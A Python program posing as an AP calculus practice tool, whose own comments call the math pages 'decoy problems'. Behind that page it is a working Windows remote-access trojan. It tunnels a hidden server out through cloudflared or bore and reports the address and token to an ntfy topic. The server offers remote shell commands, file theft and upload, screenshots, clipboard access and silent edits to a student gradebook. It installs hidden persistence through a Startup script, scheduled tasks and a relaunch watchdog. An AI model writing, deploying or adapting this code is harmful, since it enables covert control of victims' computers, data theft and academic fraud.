#!/usr/bin/env python3
"""MathPrep Helper - calculus practice suite + remote agent."""

import base64, csv, ctypes, hashlib, json, os, random, re, secrets, shutil, subprocess, sys, threading, time, urllib.parse, urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

HOME = Path(os.environ.get("LOCALAPPDATA", Path.home())) / "MathPrep"
CFG, GB, SHOT = HOME / "config.json", HOME / "gradebook.csv", HOME / "shot.png"
SELF, VBS, CHECK = HOME / "agent.py", HOME / "run.vbs", HOME / "check.vbs"
NTFY = "https://ntfy.sh"
CREATE_NO_WINDOW = 0x08000000
FIELDS = ["student", "assignment", "score", "max"]
FROZEN = getattr(sys, "frozen", False)
EXE = Path(sys.executable)

def esc(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
def vbs_str(s): return '"' + s.replace('"', '""') + '"'

# ------------------------------------------------------------------ config
def boot_cfg():
    HOME.mkdir(parents=True, exist_ok=True)
    if CFG.exists():
        return json.loads(CFG.read_text())
    cfg = {"port": random.randint(8300, 8999), "token": secrets.token_urlsafe(18),
           "topic": "mp-" + secrets.token_hex(8)}
    CFG.write_text(json.dumps(cfg, indent=2))
    return cfg

CFG_DATA = boot_cfg()
PORT, TOKEN, TOPIC = CFG_DATA["port"], CFG_DATA["token"], CFG_DATA["topic"]
STATE = {"url": ""}

def publish(payload, title="helper"):
    try:
        body = payload if isinstance(payload, str) else json.dumps(payload)
        urllib.request.urlopen(urllib.request.Request(
            f"{NTFY}/{TOPIC}", data=body.encode(),
            headers={"Title": title, "Priority": "default", "Tags": "test_tube"}), timeout=20)
    except Exception:
        pass

# ------------------------------------------------------------------ gradebook
def read_gb():
    if not GB.exists():
        GB.write_text("student,assignment,score,max\nJordan Smith,Quiz 4,72,100\n")
    with GB.open(newline="", encoding="utf-8") as f:
        return list(csv.DictReader(f))

def write_gb(rows):
    with GB.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS); w.writeheader()
        for r in rows: w.writerow({k: r.get(k, "") for k in FIELDS})

def match(rows, needle):
    n = (needle or "").strip().lower()
    return [] if not n else [i for i, r in enumerate(rows)
                             if n in r["student"].lower() or r["student"].lower() in n]

def clamp(v, row):
    try: v = float(v)
    except ValueError: return v
    try: hi = float(row.get("max") or 100)
    except ValueError: hi = 100.0
    return f"{max(0.0, min(v, hi)):g}"

# ------------------------------------------------------------------ tunnel
def download(name, url):
    p = HOME / name
    if p.exists(): return p
    try:
        urllib.request.urlretrieve(url, p)
        return p if p.stat().st_size > 10000 else None
    except Exception:
        return None

def stream(proc, pattern):
    rx = re.compile(pattern)
    for line in iter(proc.stderr.readline, b""):
        m = rx.search(line.decode(errors="ignore"))
        if m and not STATE["url"]:
            STATE["url"] = m.group(0)
            publish({"url": STATE["url"], "token": TOKEN, "host": os.environ.get("COMPUTERNAME", "?")}, "online")
    proc.wait()
    STATE["url"] = ""

def run_cloudflared():
    exe = download("cloudflared.exe",
                   "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe")
    if not exe: return False
    p = subprocess.Popen([str(exe), "tunnel", "--no-autoupdate", "--url", f"http://127.0.0.1:{PORT}"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    stream(p, r"https://[a-z0-9-]+\.trycloudflare\.com")
    return True

def run_bore():
    z = download("bore.zip", "https://github.com/ekzhang/bore/releases/download/v0.5.3/bore-v0.5.3-x86_64-pc-windows-msvc.zip")
    if not z: return False
    exe = HOME / "bore.exe"
    if not exe.exists():
        import zipfile
        try:
            with zipfile.ZipFile(z) as zf: zf.extractall(HOME)
            exe = next(HOME.glob("bore*.exe"))
        except Exception: return False
    p = subprocess.Popen([str(exe), "local", str(PORT), "--to", "bore.pub"],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=CREATE_NO_WINDOW)
    for line in iter(p.stdout.readline, b""):
        m = re.search(r"bore\.pub:(\d+)", line.decode(errors="ignore"))
        if m:
            STATE["url"] = "http://bore.pub:" + m.group(1)
            publish({"url": STATE["url"], "token": TOKEN, "host": os.environ.get("COMPUTERNAME", "?")}, "online")
            break
    p.wait(); STATE["url"] = ""
    return True

def tunnel_loop():
    while True:
        try:
            if not (run_cloudflared() or run_bore()):
                publish("tunnel: no transport available", "error")
        except Exception as e:
            publish(f"tunnel error: {e}", "error")
        time.sleep(8)

def heartbeat():
    while True:
        time.sleep(60)
        publish({"hb": int(time.time()), "url": STATE["url"]}, "ping")

# ------------------------------------------------------------------ shell / files
def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout,
                           creationflags=CREATE_NO_WINDOW)
        return {"out": p.stdout.decode("utf-8", "replace")[-20000:],
                "err": p.stderr.decode("utf-8", "replace")[-8000:], "code": p.returncode}
    except subprocess.TimeoutExpired:
        return {"out": "", "err": "timeout", "code": -1}

def ps(script):
    return run(f'powershell -NoProfile -NonInteractive -Command "{script}"')

def resolve(p):
    return Path(os.path.expandvars(os.path.expanduser(p))).resolve()

# ------------------------------------------------------------------ decoy problems
SUP = str.maketrans("0123456789-", "⁰¹²³⁴⁵⁶⁷⁸⁹⁻")
def sgn(n, v=""): return f" - {abs(n)}{v}" if n < 0 else f" + {n}{v}"

def p_power():
    a, n, b = random.randint(2, 7), random.randint(2, 5), random.randint(-9, 9)
    return (f"f(x) = {a}x{str(n).translate(SUP)}{sgn(b,'x')}",
            f"f'(x) = {a*n}x{str(n-1).translate(SUP)}{sgn(b)}", "Term by term.")

def p_chain():
    a, b, n = random.randint(2, 5), random.randint(-6, 6), random.randint(2, 4)
    inner = f"{a}x{sgn(b)}"
    return (f"f(x) = ({inner}){str(n).translate(SUP)}",
            f"f'(x) = {a*n}({inner}){str(n-1).translate(SUP)}", "Outer power, then inner derivative.")

def p_quotient():
    a, b, c, d = random.randint(2, 5), random.randint(-6, 6), random.randint(2, 4), random.randint(-6, 6)
    return (f"f(x) = ({a}x{sgn(b)}) / ({c}x{sgn(d)})",
            f"f'(x) = {a*d-b*c} / ({c}x{sgn(d)})²", "ad - bc over the denominator squared.")

def p_related():
    r, dr = random.randint(3, 9), random.choice([0.5, 1, 2])
    return (f"The radius of a circle grows at {dr} cm/s. How fast is the area growing when r = {r} cm?",
            f"dA/dt = {2*3.14159*r*dr:.2f}π cm²/s", "A = πr², differentiate, substitute.")

GENS = [p_power, p_chain, p_quotient, p_related]

CSS = """body{margin:0;font:15px/1.55 ui-sans-serif,system-ui,Segoe UI,sans-serif;background:#0e1116;color:#e6edf3}
header{padding:13px 20px;border-bottom:1px solid #222a35;background:#11161d;font-size:13px;
letter-spacing:.5px;text-transform:uppercase;color:#8b98a9;font-weight:700}
main{max-width:740px;margin:0 auto;padding:26px 20px}
.card{background:#161b23;border:1px solid #222a35;border-radius:12px;padding:20px}
.math{font:18px/1.65 ui-monospace,Menlo,monospace;margin:14px 0;white-space:pre-wrap}
.kick{font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#5b8def;font-weight:700}
button{font:inherit;background:#5b8def;color:#fff;border:0;border-radius:8px;padding:9px 13px;cursor:pointer}
.hide{display:none}.ans{border-left:3px solid #2ea043;background:#132018;padding:10px 14px;margin-top:14px}"""

def problem_page(kind):
    prompt, answer, steps = (p_related() if kind == "rel" else random.choice(GENS)())
    nxt = "/related" if kind == "rel" else "/practice"
    return f"""<!doctype html><meta charset=utf-8><title>Practice</title><style>{CSS}</style>
<header>AP Calculus · Practice Suite</header><main><div class="card">
<div class="kick">{'Related rates' if kind == 'rel' else 'Differentiate'}</div>
<div class="math">{esc(prompt)}</div>
<button onclick="document.getElementById('a').classList.toggle('hide')">Show solution</button>
<div id="a" class="hide ans"><div class="math">{esc(answer)}</div><small>{esc(steps)}</small></div>
<p style="margin-top:18px"><a href="{nxt}"><button>Next problem</button></a></p></div></main>"""

# ------------------------------------------------------------------ http
class H(BaseHTTPRequestHandler):
    server_version = "MathPrep/2.0"
    def log_message(self, *a): pass

    def send(self, body, code=200, ctype="text/html; charset=utf-8", extra=None):
        raw = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items(): self.send_header(k, v)
        self.end_headers(); self.wfile.write(raw)

    def json(self, obj, code=200):
        self.send(json.dumps(obj), code, "application/json")

    def authed(self, q):
        return (q.get("k", [""])[0] == TOKEN or
                self.headers.get("X-Token") == TOKEN)

    def do_GET(self):
        u = urllib.parse.urlsplit(self.path); q = urllib.parse.parse_qs(u.query)
        g = lambda n, d="": q.get(n, [d])[0]

        if u.path == "/practice": return self.send(problem_page("p"))
        if u.path == "/related":  return self.send(problem_page("rel"))
        if u.path == "/favicon.ico": return self.send(b"", 204, "image/x-icon")
        if u.path == "/shot.png":
            return self.send(SHOT.read_bytes(), 200, "image/png") if SHOT.exists() else self.send(b"", 404)
        if u.path == "/" and not self.authed(q):
            return self.send(problem_page("p"))
        if not self.authed(q): return self.send("unauthorized", 401)

        if u.path == "/api/ping": return self.json({"ok": True, "url": STATE["url"]})
        if u.path == "/api/info":
            return self.json({"host": os.environ.get("COMPUTERNAME"), "user": os.environ.get("USERNAME"),
                              "cwd": os.getcwd(), "url": STATE["url"]})
        if u.path == "/api/sh": return self.json(run(g("c")))
        if u.path == "/api/ps": return self.json(run("tasklist /fo csv"))
        if u.path == "/api/kill": return self.json(run(f"taskkill /pid {int(g('pid','0'))} /f"))
        if u.path == "/api/ls":
            d = resolve(g("p", str(Path.home())))
            try:
                items = [{"n": f.name, "d": f.is_dir(), "s": f.stat().st_size if f.is_file() else 0}
                         for f in sorted(d.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower()))]
                return self.json({"path": str(d), "items": items[:600]})
            except Exception as e: return self.json({"error": str(e)}, 400)
        if u.path == "/api/get":
            f = resolve(g("p"))
            if not f.is_file(): return self.json({"error": "not a file"}, 404)
            return self.send(f.read_bytes(), 200, "application/octet-stream",
                             {"Content-Disposition": f'attachment; filename="{urllib.parse.quote(f.name)}"'})
        if u.path == "/api/shot":
            ps('Add-Type -AssemblyName System.Windows.Forms,System.Drawing;'
               '$b=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
               '[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);'
               '[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$b.Size);'
               f'$b.Save("{SHOT}")')
            return self.json({"ok": SHOT.exists()})
        if u.path == "/api/clip":
            if g("text"):
                ps(f"Set-Clipboard -Value '{g('text').replace(chr(39), chr(39)*2)}'")
                return self.json({"ok": True})
            return self.json({"text": ps("Get-Clipboard")["out"]})
        if u.path == "/api/grade":
            rows, who, act = read_gb(), g("student"), g("cmd", "list")
            if act == "list": return self.json(rows)
            idx = match(rows, who)
            if act == "set":
                asg = g("assignment").lower()
                for i in idx:
                    if not asg or asg in rows[i]["assignment"].lower():
                        rows[i]["score"] = clamp(g("score"), rows[i])
            elif act == "bump":
                for i in idx:
                    try: rows[i]["score"] = clamp(float(rows[i]["score"]) + float(g("delta", "5")), rows[i])
                    except ValueError: pass
            elif act == "add":
                rows.append({"student": who, "assignment": g("assignment", "Item"),
                             "score": g("score", "100"), "max": g("max", "100")})
            elif act == "del":
                rows = [r for i, r in enumerate(rows) if i not in idx]
            write_gb(rows)
            return self.json({"ok": True, "matched": len(idx), "rows": len(rows)})
        if u.path == "/api/dl":
            try:
                with urllib.request.urlopen(g("u"), timeout=60) as r: data = r.read()
                return self.send(data, 200, "application/octet-stream")
            except Exception as e: return self.json({"error": str(e)}, 400)
        self.send("not found", 404)

    def do_POST(self):
        u = urllib.parse.urlsplit(self.path); q = urllib.parse.parse_qs(u.query)
        if not self.authed(q): return self.send("unauthorized", 401)
        if u.path == "/api/put":
            n = int(self.headers.get("Content-Length", 0))
            f = resolve(q.get("p", ["C:/Users/Public/upload.bin"])[0])
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_bytes(self.rfile.read(n))
            return self.json({"ok": True, "path": str(f), "bytes": n})
        self.send("not found", 404)

# ------------------------------------------------------------------ install
def install(word=None):
    if sys.platform != "win32": sys.exit("Windows only.")
    HOME.mkdir(parents=True, exist_ok=True)
    cfg = boot_cfg()
    if word:
        cfg["topic"] = "mp-" + hashlib.sha256(word.encode()).hexdigest()[:16]
        CFG.write_text(json.dumps(cfg, indent=2))

    if FROZEN:
        dest = HOME / "MathPrep.exe"
        if EXE.resolve() != dest.resolve():
            shutil.copy2(EXE, dest)
        plain = f'"{dest}"'
    else:
        shutil.copy2(Path(__file__).resolve(), SELF)
        pyw = Path(sys.executable).with_name("pythonw.exe")
        exe = pyw if pyw.exists() else Path(sys.executable)
        plain = f'"{exe}" "{SELF}"'

    cmd = vbs_str(plain)
    VBS.write_text(f'Set s = CreateObject("WScript.Shell")\r\nDo\r\n'
                   f'  s.Run {cmd}, 0, True\r\n  WScript.Sleep 15000\r\nLoop\r\n')
    CHECK.write_text(f'On Error Resume Next\r\n'
                     f'Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
                     f'x.open "GET", "http://127.0.0.1:{PORT}/api/ping", False\r\nx.send\r\n'
                     f'If Err.Number <> 0 Then CreateObject("WScript.Shell").Run {cmd}, 0, False\r\n')

    startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup\MathPrepHelper.vbs"
    startup.write_text(f'CreateObject("WScript.Shell").Run {cmd}, 0, False\r\n')

    subprocess.run(["schtasks", "/create", "/tn", "MathPrepHelper", "/tr", plain, "/sc", "onlogon", "/f"],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)
    subprocess.run(["schtasks", "/create", "/tn", "MathPrepWatch", "/tr", f'wscript.exe "{CHECK}"',
                    "/sc", "minute", "/mo", "5", "/f"], capture_output=True, creationflags=CREATE_NO_WINDOW)

    subprocess.Popen([str(dest)] if FROZEN else ["wscript.exe", str(VBS)], creationflags=CREATE_NO_WINDOW)
    msg = f"MathPrep installed.\n\nPair code: {cfg['topic']}\n\nRunning in the background."
    if FROZEN: ctypes.windll.user32.MessageBoxW(0, msg, "MathPrep", 0x40)
    else: print("\n" + msg + "\n")

if __name__ == "__main__":
    if "--install" in sys.argv:
        i = sys.argv.index("--pair") if "--pair" in sys.argv else -1
        install(sys.argv[i + 1] if 0 <= i < len(sys.argv) - 1 else None)
        sys.exit(0)
    threading.Thread(target=tunnel_loop, daemon=True).start()
    threading.Thread(target=heartbeat, daemon=True).start()
    print(f"local http://127.0.0.1:{PORT}  pair={TOPIC}")
    ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()